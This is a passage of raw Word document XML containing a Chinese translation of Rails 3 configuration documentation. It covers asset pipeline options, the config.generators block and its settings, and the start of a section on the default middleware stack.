        <w:t xml:space="preserve"> 指定资源预编译器的待编译列表文件所在目录完整的路径。默认使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (译者注: 也就是开头有一列诸如 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>//=require jquery</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件所在路径)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012797DB" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15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config.assets.cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定 Sprockets 使用的缓存存储. 默认是 Rails 的文件存储。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F96CEC" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15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config.assets.version</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个字符串选项，用于生成 MD5 哈希值。可以被更改从而强制对所有文件进行预编译.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D474B4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="154"/>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config.assets.compile</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个布尔值，可以用于让Sprockets 在生产环境即时执行编译。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368DC999" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15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config.assets.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个遵循 Log4r 或者 Ruby 默认 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类接口的日志类.默认和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的一样。设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 false, 就可以关闭记录资源处理的日志。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787BD2DD"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3.3 配置生成器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415551C9"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Rails 3 允许你使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.generators</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法修改生成器.这个方法接受一个代码块:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="24CF8830" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="012F5C46"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config.generators do</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|g|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10F38B27"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g.orm :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A2E009A"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g.test_framework :test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01DA0A73"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="48A86BF0"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可以在这个代码块里使用的所有方法列表如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0041A025"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assets</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 允许在创建一个 scaffold 时候创建资源文件。默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A969A1"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force_plural</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 运行将数据模型(model)的名字都变成复数。默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E463C8D"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helper</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定是否要创建 helpers. 默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578DC736"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integration_tool</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定使用哪个集成工具。默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75204239"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javascripts</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开启生成器中 javascripts 的 hook. 被使用于 Rails 运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 生成器的时候。默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71997C37"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javascript_engine</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置用于生成资源的引擎(例如, coffee).默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283F3F65"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orm</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定使用哪个orm. 默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且默认使用 Active Record.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6FD172"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performance_tool</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定使用哪个性能工具.默认为</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C2CE64"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resource_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定当使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate resource</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">时,生成控制器的生成器.默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D74B335"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scaffold_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resource_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">不同，当使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">时，指定生成器生成 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scaffolded</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010BF324"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stylesheets</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开启生成器中的式样的 hook 。在Rails中被用于 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>scaffold</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 生成器运行的时候， 但这个 hook 也可以用在其它生成器。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427B5B5C"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stylesheets_engine</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置生成资源的式样引擎(例如, sass)。默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116CA381"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test_framework</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定使用哪个测试框架。默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 并且默认使用 Test::Unit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC94AF5" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15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template_engine</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定使用哪个模板引擎，比如 ERB 或 Haml.默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:erb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384D4A3C"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3.4 配置中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0825A03D"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所有的 Rails 应用程序都来自于一系列标准的中间件，这些中间件以下列顺序被使用于开发环境:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2680FFBB"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ActionDispatch::SSL</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 强制所有请求走HTTPS协议。在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.force_ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候有效。传递给它的选项可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.ssl_options</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 编辑.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDF6BEC"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ActionDispatch::Static</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于处理静态资源。在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.serve_static_assets</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
